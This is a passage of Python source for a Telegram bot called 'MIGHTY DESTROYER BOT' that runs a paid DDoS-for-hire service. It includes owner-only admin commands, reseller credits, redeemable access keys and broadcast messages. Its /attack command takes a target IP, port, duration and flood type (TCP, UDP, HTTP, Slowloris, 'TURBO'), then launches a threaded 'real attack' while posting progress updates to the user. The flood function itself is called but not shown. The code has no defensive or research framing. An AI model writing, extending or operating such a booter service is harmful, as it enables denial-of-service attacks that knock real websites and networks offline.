RAM: {mem.percent}% ({mem.used//(1024**3)}GB/{mem.total//(1024**3)}GB)
Disk: {disk.percent}% ({disk.used//(1024**3)}GB/{disk.total//(1024**3)}GB)
Uptime: {uptime_str}"""
        await update.message.reply_text(msg)
    except:
        await update.message.reply_text("psutil not installed. Install with: pip install psutil")

async def private_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Owner only")
        return
    rows = c.execute("SELECT user_id, approved_until, total_time_used, attacks_count FROM users WHERE approved=1").fetchall()
    if not rows:
        await update.message.reply_text("No approved users.")
        return
    msg = "👥 Active Users:\n" + "\n".join(f"User {r[0]} | Expires {r[1][:10] if r[1] else 'N/A'} | Used {r[2]}s | Attacks {r[3]}" for r in rows)
    await update.message.reply_text(msg)

async def settime(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Owner only")
        return
    if not context.args or not context.args[0].isdigit():
        await update.message.reply_text("Usage: /settime <seconds>")
        return
    global MAX_ATTACK_TIME
    MAX_ATTACK_TIME = int(context.args[0])
    save_setting("max_time", MAX_ATTACK_TIME)
    await update.message.reply_text(f"✅ Max attack time set to {MAX_ATTACK_TIME}s")

async def setcooldown(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Owner only")
        return
    if not context.args or not context.args[0].isdigit():
        await update.message.reply_text("Usage: /setcooldown <seconds>")
        return
    global COOLDOWN_SECONDS
    COOLDOWN_SECONDS = int(context.args[0])
    save_setting("cooldown", COOLDOWN_SECONDS)
    await update.message.reply_text(f"✅ Cooldown set to {COOLDOWN_SECONDS}s")

async def setconcurrent(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Owner only")
        return
    if not context.args or not context.args[0].isdigit():
        await update.message.reply_text("Usage: /setconcurrent <number>")
        return
    global MAX_CONCURRENT_ATTACKS
    MAX_CONCURRENT_ATTACKS = int(context.args[0])
    save_setting("concurrent", MAX_CONCURRENT_ATTACKS)
    await update.message.reply_text(f"✅ Max concurrent attacks set to {MAX_CONCURRENT_ATTACKS}")

async def port_protection_toggle(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Owner only")
        return
    if not context.args or context.args[0] not in ["on","off"]:
        await update.message.reply_text("Usage: /port_protection on/off")
        return
    global PORT_PROTECTION
    PORT_PROTECTION = context.args[0] == "on"
    save_setting("port_protection", "on" if PORT_PROTECTION else "off")
    await update.message.reply_text(f"✅ Port protection {context.args[0].upper()}")

async def maintenance_toggle(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Owner only")
        return
    if not context.args or context.args[0] not in ["on","off"]:
        await update.message.reply_text("Usage: /maintenance on/off")
        return
    global MAINTENANCE_MODE
    MAINTENANCE_MODE = context.args[0] == "on"
    save_setting("maintenance", "on" if MAINTENANCE_MODE else "off")
    await update.message.reply_text(f"✅ Maintenance mode {context.args[0].upper()}")

async def broadcast_private_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Owner only")
        return
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /broadcast_private_users <msg>")
        return
    msg = " ".join(args)
    users = c.execute("SELECT user_id FROM users WHERE approved=1").fetchall()
    sent = 0
    for (uid,) in users:
        try:
            await context.bot.send_message(uid, f"📢 {msg}\n\n{POWERED_BY}")
            sent += 1
        except:
            pass
    await update.message.reply_text(f"Sent to {sent} private users.")

async def broadcast_all_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Owner only")
        return
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /broadcast_all_users <msg>")
        return
    msg = " ".join(args)
    users = c.execute("SELECT user_id FROM users").fetchall()
    sent = 0
    for (uid,) in users:
        try:
            await context.bot.send_message(uid, f"📢 {msg}\n\n{POWERED_BY}")
            sent += 1
        except:
            pass
    await update.message.reply_text(f"Sent to {sent} total users.")

# ---------- REAL ATTACK COMMAND ----------
async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id

    if not is_approved_user(user_id):
        await update.message.reply_text("❌ Not approved. Use /redeem.")
        return

    group_limits = None
    if update.effective_chat.type != "private":
        group_limits = get_group_settings(chat_id)
        if not group_limits.get("max_concurrent", 0):
            await update.message.reply_text("❌ This group is not approved for attacks.")
            return

    if user_id in user_cooldown:
        remaining = COOLDOWN_SECONDS - (time.time() - user_cooldown[user_id])
        if remaining > 0:
            await update.message.reply_text(f"⏳ Cooldown: {int(remaining)}s left.")
            return

    args = context.args
    if len(args) < 3:
        await update.message.reply_text("Usage: /attack <ip> <port> <duration> [type]\nTypes: TCP, UDP, HTTP, SLOWLORIS, TURBO (default)")
        return

    ip = args[0]
    port_str = args[1]
    duration_str = args[2]
    attack_type = args[3].upper() if len(args) > 3 else "TURBO"
    
    try:
        port = int(port_str)
        duration = int(duration_str)
        if port <= 0 or port > 65535: raise ValueError
        max_time = group_limits["max_time"] if group_limits else MAX_ATTACK_TIME
        if duration <= 0 or duration > max_time:
            await update.message.reply_text(f"❌ Duration must be 1-{max_time}s")
            return
        if attack_type not in ["TCP", "UDP", "HTTP", "SLOWLORIS", "TURBO"]:
            await update.message.reply_text("❌ Invalid attack type. Use: TCP, UDP, HTTP, SLOWLORIS, TURBO")
            return
    except ValueError:
        await update.message.reply_text("❌ Invalid port or duration.")
        return

    if PORT_PROTECTION and port in BLOCKED_PORTS:
        await update.message.reply_text(f"🚫 Port {port} is blocked.")
        return

    global_limit = MAX_CONCURRENT_ATTACKS
    group_limit = group_limits["max_concurrent"] if group_limits else global_limit
    if len(active_attacks) >= min(global_limit, group_limit):
        await update.message.reply_text("⚠️ Max concurrent attacks reached. Try later.")
        return

    # Resolve IP if domain given
    try:
        target_ip = socket.gethostbyname(ip)
    except:
        await update.message.reply_text("❌ Cannot resolve target IP.")
        return

    # Use SSL if port is 443
    use_ssl = (port == 443)
    path = "/"
    
    attack_id = f"#MIGHTY-{random.randint(100000, 999999)}"
    log_attack(user_id, target_ip, port, duration, attack_type)

    user_cooldown[user_id] = time.time()
    active_attacks[user_id] = True
    
    # Start real attack in a separate thread
    def attack_thread_func():
        run_real_attack(target_ip, port, attack_type, duration, 1000, use_ssl, path, 10)
        # Attack finished
        del active_attacks[user_id]
    
    thread = threading.Thread(target=attack_thread_func)
    thread.daemon = True
    thread.start()
    attack_threads[user_id] = thread
    
    # Progress message (simulated, since real attack is non-blocking)
    sent_msg = await update.message.reply_text(f"🔥 **REAL ATTACK STARTED!**\nAttack ID: `{attack_id}`\nTarget: `{target_ip}:{port}`\nType: {attack_type}\nDuration: {duration}s\n{POWERED_BY}", parse_mode='Markdown')
    
    # Wait for duration
    for remaining in range(duration, 0, -5):
        await asyncio.sleep(5)
        if user_id not in active_attacks:
            break
        try:
            await sent_msg.edit_text(f"🔥 **ATTACK IN PROGRESS**\nAttack ID: `{attack_id}`\nTarget: `{target_ip}:{port}`\nRemaining: {remaining}s\n{POWERED_BY}", parse_mode='Markdown')
        except:
            pass
    
    await asyncio.sleep(1)
    if user_id in active_attacks:
        del active_attacks[user_id]
    await sent_msg.edit_text(f"✅ **ATTACK FINISHED**\nAttack ID: `{attack_id}`\nTarget: `{target_ip}:{port}`\nTotal duration: {duration}s\n{POWERED_BY}", parse_mode='Markdown')

# ---------- MAIN ----------
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("menu", menu))
    app.add_handler(CommandHandler("redeem", redeem))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("approve", approve_user))
    app.add_handler(CommandHandler("approvegroup", approve_group))
    app.add_handler(CommandHandler("disapprove", disapprove_group))
    app.add_handler(CommandHandler("approved_groups", approved_groups))
    app.add_handler(CommandHandler("ban", ban_user))
    app.add_handler(CommandHandler("unban", unban_user))
    app.add_handler(CommandHandler("banned_list", banned_list))
    app.add_handler(CommandHandler("add_reseller", add_reseller))
    app.add_handler(CommandHandler("remove_reseller", remove_reseller))
    app.add_handler(CommandHandler("resellers", resellers_list))
    app.add_handler(CommandHandler("addcredit", addcredit))
    app.add_handler(CommandHandler("removecredit", removecredit))
    app.add_handler(CommandHandler("reseller_credits", reseller_credits))
    app.add_handler(CommandHandler("gen", gen))
    app.add_handler(CommandHandler("genkey", genkey))
    app.add_handler(CommandHandler("gential", gential))
    app.add_handler(CommandHandler("state", state))
    app.add_handler(CommandHandler("view_logs", view_logs))
    app.add_handler(CommandHandler("server_stats", server_stats))
    app.add_handler(CommandHandler("private_users", private_users))
    app.add_handler(CommandHandler("settime", settime))
    app.add_handler(CommandHandler("setcooldown", setcooldown))
    app.add_handler(CommandHandler("setconcurrent", setconcurrent))
    app.add_handler(CommandHandler("port_protection", port_protection_toggle))
    app.add_handler(CommandHandler("maintenance", maintenance_toggle))
    app.add_handler(CommandHandler("broadcast_private_users", broadcast_private_users))
    app.add_handler(CommandHandler("broadcast_all_users", broadcast_all_users))
    
    print("🤖 MIGHTY DESTROYER BOT STARTED - REAL ATTACK ENGINE ACTIVE")
    app.run_polling()

if __name__ == "__main__":
    main()
